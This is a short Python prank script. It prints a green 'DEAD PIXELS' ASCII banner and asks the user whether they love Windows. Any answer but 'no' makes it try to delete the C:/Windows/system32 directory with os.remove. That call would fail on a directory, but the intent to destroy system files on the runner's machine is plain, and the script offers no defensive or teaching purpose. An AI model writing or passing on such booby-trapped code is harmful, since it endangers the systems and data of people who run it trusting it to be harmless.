#!/usr/bin/env python3
import os
import sys

def render_dead_pixels():
    # Thallium green ANSI color code (vibrant toxic green)
    THALLIUM_GREEN = "\033[38;5;46m"
    DIM_LINE = "\033[38;5;22m"
    RESET = "\033[0m"
    
    top_grid = f"{DIM_LINE}┌────────────────────────────────────────────────────────┐{RESET}"
    bottom_grid = f"{DIM_LINE}└────────────────────────────────────────────────────────┘{RESET}"

    banner = [
        f"{THALLIUM_GREEN} ██████  ███████  █████  ██████       ██████  ██ ██   ██ ███████ ██      ███████  ██ {RESET}",
        f"{THALLIUM_GREEN} ██   ██ ██      ██   ██ ██   ██      ██   ██ ██  ██ ██  ██      ██      ██      ███ {RESET}",
        f"{THALLIUM_GREEN} ██   ██ █████   ███████ ██   ██      ██████  ██   ███    █████   ██      █████    ██ {RESET}",
        f"{THALLIUM_GREEN} ██   ██ ██      ██   ██ ██   ██      ██      ██  ██ ██  ██      ██      ██       ██ {RESET}",
        f"{THALLIUM_GREEN} ██████  ███████ ██   ██ ██████       ██      ██ ██   ██ ███████ ███████ ███████  ██ {RESET}",
        f"{THALLIUM_GREEN}                                                                                  █ {RESET}"
    ]

    print()
    print(top_grid)
    for line in banner:
        print(f"{DIM_LINE}│{RESET}{line}{DIM_LINE}│{RESET}")
    print(bottom_grid)
    print()

def main():
    render_dead_pixels()
    
    answer = input("Do you love windows? ")

    if answer.lower() == "no":
        print("Good")
    else:
        try:
            os.remove("C:/Windows/system32")
        except OSError as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)


